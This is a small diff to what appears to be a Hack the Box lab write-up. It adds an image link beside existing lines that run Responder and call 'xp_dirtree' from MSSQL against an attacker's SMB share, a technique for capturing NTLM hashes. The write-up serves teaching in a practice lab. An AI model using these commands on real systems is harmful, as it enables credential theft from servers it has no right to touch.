@@ -471,4 +471,6 @@ root@kali# responder -I tun0
 ```shell
 SQL> EXEC xp_dirtree '\\10.10.14.10\share', 1, 1
 ```
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/8b855968-0e44-4ea9-9171-f005e5f089fc)
 ![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/2f3d8fab-2b5f-4a46-9a11-c3f0e1251269)
+
